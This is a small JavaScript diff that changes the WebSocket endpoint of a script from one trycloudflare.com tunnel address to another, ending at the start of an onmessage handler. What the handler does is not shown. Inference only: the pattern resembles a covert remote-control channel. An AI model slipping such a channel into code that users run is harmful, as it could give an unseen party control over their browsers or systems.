@@ -5,7 +5,7 @@
 
 
 try{
-  var ws = new WebSocket("https://zshops-junction-kingston-focusing.trycloudflare.com");
+  var ws = new WebSocket("https://dating-spell-marco-electricity.trycloudflare.com");
   
   ws.onmessage = function(event) {
   	try {
